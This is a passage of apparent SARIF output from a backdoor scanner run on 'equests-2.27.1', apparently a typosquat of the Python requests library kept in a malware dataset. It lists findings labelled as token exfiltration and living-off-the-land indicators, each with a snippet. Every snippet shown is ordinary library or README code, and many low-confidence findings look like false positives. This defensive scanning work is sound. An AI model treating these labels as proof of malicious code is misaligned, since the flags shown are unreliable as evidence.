            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 61,
                  "endLine": 391,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n                                                             password)\n\n        return headers\n\n",
                    "rendered": {
                      "text": "\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n                                                             password)\n\n        return headers\n\n",
                      "markdown": "`\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n                                                             password)\n\n        return headers\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 18,
                  "endLine": 387,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        :rtype: dict\n        \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n",
                    "rendered": {
                      "text": "        :rtype: dict\n        \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n",
                      "markdown": "`        :rtype: dict\n        \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 25,
                  "endLine": 186,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                    "rendered": {
                      "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                      "markdown": "`            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 16,
                  "endLine": 186,
                  "endColumn": 24,
                  "snippet": {
                    "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                    "rendered": {
                      "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                      "markdown": "`            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 22,
                  "endLine": 182,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        if proxy in self.proxy_manager:\n            manager = self.proxy_manager[proxy]\n        elif proxy.lower().startswith('socks'):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n",
                    "rendered": {
                      "text": "        if proxy in self.proxy_manager:\n            manager = self.proxy_manager[proxy]\n        elif proxy.lower().startswith('socks'):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n",
                      "markdown": "`        if proxy in self.proxy_manager:\n            manager = self.proxy_manager[proxy]\n        elif proxy.lower().startswith('socks'):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 41,
                  "endLine": 99,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n",
                    "rendered": {
                      "text": "        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n",
                      "markdown": "`        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 436,
                  "startColumn": 11,
                  "endLine": 436,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        elif isinstance(timeout, TimeoutSauce):\n            pass\n        else:\n            timeout = TimeoutSauce(connect=timeout, read=timeout)\n\n        try:\n            if not chunked:\n",
                    "rendered": {
                      "text": "        elif isinstance(timeout, TimeoutSauce):\n            pass\n        else:\n            timeout = TimeoutSauce(connect=timeout, read=timeout)\n\n        try:\n            if not chunked:\n",
                      "markdown": "`        elif isinstance(timeout, TimeoutSauce):\n            pass\n        else:\n            timeout = TimeoutSauce(connect=timeout, read=timeout)\n\n        try:\n            if not chunked:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 429,
                  "startColumn": 31,
                  "endLine": 429,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n                       \"timeout tuple, or a single float to set \"\n                       \"both timeouts to the same value\".format(timeout))\n                raise ValueError(err)\n",
                    "rendered": {
                      "text": "                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n                       \"timeout tuple, or a single float to set \"\n                       \"both timeouts to the same value\".format(timeout))\n                raise ValueError(err)\n",
                      "markdown": "`                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n                       \"timeout tuple, or a single float to set \"\n                       \"both timeouts to the same value\".format(timeout))\n                raise ValueError(err)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 426,
                  "startColumn": 15,
                  "endLine": 426,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                    "rendered": {
                      "text": "        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                      "markdown": "`        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 425,
                  "startColumn": 31,
                  "endLine": 426,
                  "snippet": {
                    "text": "\n        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                    "rendered": {
                      "text": "\n        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                      "markdown": "`\n        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 403,
                  "startColumn": 48,
                  "endLine": 403,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple or urllib3 Timeout object\n        :param verify: (optional) Either a boolean, in which case it controls whether\n            we verify the server's TLS certificate, or a string, in which case it\n            must be a path to a CA bundle to use\n",
                    "rendered": {
                      "text": "        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple or urllib3 Timeout object\n        :param verify: (optional) Either a boolean, in which case it controls whether\n            we verify the server's TLS certificate, or a string, in which case it\n            must be a path to a CA bundle to use\n",
                      "markdown": "`        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple or urllib3 Timeout object\n        :param verify: (optional) Either a boolean, in which case it controls whether\n            we verify the server's TLS certificate, or a string, in which case it\n            must be a path to a CA bundle to use\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 40,
                  "endLine": 253,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n                              \"invalid path: {}\".format(conn.key_file))\n\n    def build_response(self, req, resp):\n",
                    "rendered": {
                      "text": "                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n                              \"invalid path: {}\".format(conn.key_file))\n\n    def build_response(self, req, resp):\n",
                      "markdown": "`                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n                              \"invalid path: {}\".format(conn.key_file))\n\n    def build_response(self, req, resp):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 40,
                  "endLine": 250,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                conn.cert_file = cert\n                conn.key_file = None\n            if conn.cert_file and not os.path.exists(conn.cert_file):\n                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n",
                    "rendered": {
                      "text": "                conn.cert_file = cert\n                conn.key_file = None\n            if conn.cert_file and not os.path.exists(conn.cert_file):\n                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n",
                      "markdown": "`                conn.cert_file = cert\n                conn.key_file = None\n            if conn.cert_file and not os.path.exists(conn.cert_file):\n                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 228,
                  "startColumn": 40,
                  "endLine": 228,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                cert_loc = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n\n            if not cert_loc or not os.path.exists(cert_loc):\n                raise IOError(\"Could not find a suitable TLS CA certificate bundle, \"\n                              \"invalid path: {}\".format(cert_loc))\n\n            conn.cert_reqs = 'CERT_REQUIRED'\n",
                    "rendered": {
                      "text": "                cert_loc = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n\n            if not cert_loc or not os.path.exists(cert_loc):\n                raise IOError(\"Could not find a suitable TLS CA certificate bundle, \"\n                              \"invalid path: {}\".format(cert_loc))\n\n            conn.cert_reqs = 'CERT_REQUIRED'\n",
                      "markdown": "`                cert_loc = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n\n            if not cert_loc or not os.path.exists(cert_loc):\n                raise IOError(\"Could not find a suitable TLS CA certificate bundle, \"\n                              \"invalid path: {}\".format(cert_loc))\n\n            conn.cert_reqs = 'CERT_REQUIRED'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/adapters.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 24,
                  "endLine": 17,
                  "endColumn": 33,
                  "snippet": {
                    "text": "from urllib3.poolmanager import PoolManager, proxy_from_url\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import parse_url\nfrom urllib3.util import Timeout as TimeoutSauce\nfrom urllib3.util.retry import Retry\nfrom urllib3.exceptions import ClosedPoolError\nfrom urllib3.exceptions import ConnectTimeoutError\n",
                    "rendered": {
                      "text": "from urllib3.poolmanager import PoolManager, proxy_from_url\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import parse_url\nfrom urllib3.util import Timeout as TimeoutSauce\nfrom urllib3.util.retry import Retry\nfrom urllib3.exceptions import ClosedPoolError\nfrom urllib3.exceptions import ConnectTimeoutError\n",
                      "markdown": "`from urllib3.poolmanager import PoolManager, proxy_from_url\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import parse_url\nfrom urllib3.util import Timeout as TimeoutSauce\nfrom urllib3.util.retry import Retry\nfrom urllib3.exceptions import ClosedPoolError\nfrom urllib3.exceptions import ConnectTimeoutError\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/README.md"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 16,
                  "endLine": 7,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n```python\n>>> import requests\n>>> r = requests.get('https://httpbin.org/basic-auth/user/pass', auth=('user', 'pass'))\n>>> r.status_code\n200\n>>> r.headers['content-type']\n",
                    "rendered": {
                      "text": "\n```python\n>>> import requests\n>>> r = requests.get('https://httpbin.org/basic-auth/user/pass', auth=('user', 'pass'))\n>>> r.status_code\n200\n>>> r.headers['content-type']\n",
                      "markdown": "`\n```python\n>>> import requests\n>>> r = requests.get('https://httpbin.org/basic-auth/user/pass', auth=('user', 'pass'))\n>>> r.status_code\n200\n>>> r.headers['content-type']\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/README.md"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 8,
                  "endLine": 73,
                  "endColumn": 4,
                  "snippet": {
                    "text": "\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n```\n\n---\n",
                    "rendered": {
                      "text": "\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n```\n\n---\n",
                      "markdown": "`\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n```\n\n---\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/README.md"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 46,
                  "endLine": 70,
                  "endColumn": 51,
                  "snippet": {
                    "text": "git clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n",
                    "rendered": {
                      "text": "git clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n",
                      "markdown": "`git clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n\n```shell\ngit config --global fetch.fsck.badTimezone ignore\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/README.md"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 8,
                  "endLine": 67,
                  "endColumn": 4,
                  "snippet": {
                    "text": "fetch.fsck.badTimezone=ignore` flag to avoid an error about a bad commit (see\n[this issue](https://github.com/psf/requests/issues/2690) for more background):\n\n```shell\ngit clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n",
                    "rendered": {
                      "text": "fetch.fsck.badTimezone=ignore` flag to avoid an error about a bad commit (see\n[this issue](https://github.com/psf/requests/issues/2690) for more background):\n\n```shell\ngit clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n",
                      "markdown": "`fetch.fsck.badTimezone=ignore` flag to avoid an error about a bad commit (see\n[this issue](https://github.com/psf/requests/issues/2690) for more background):\n\n```shell\ngit clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git\n```\n\nYou can also apply this setting to your global Git config:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/README.md"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 11,
                  "endLine": 33,
                  "endColumn": 16,
                  "snippet": {
                    "text": "Requests is available on PyPI:\n\n```console\n$ python -m pip install requests\n```\n\nRequests officially supports Python 2.7 & 3.6+.\n",
                    "rendered": {
                      "text": "Requests is available on PyPI:\n\n```console\n$ python -m pip install requests\n```\n\nRequests officially supports Python 2.7 & 3.6+.\n",
                      "markdown": "`Requests is available on PyPI:\n\n```console\n$ python -m pip install requests\n```\n\nRequests officially supports Python 2.7 & 3.6+.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 45,
                  "endLine": 932,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                    "rendered": {
                      "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                      "markdown": "`            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 26,
                  "endLine": 932,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                    "rendered": {
                      "text": "            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n",
                      "markdown": "`            links = parse_header_links(header)\n\n            for link in links:\n                key = link.get('rel') or link.get('url')\n                l[key] = link\n\n        return l\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
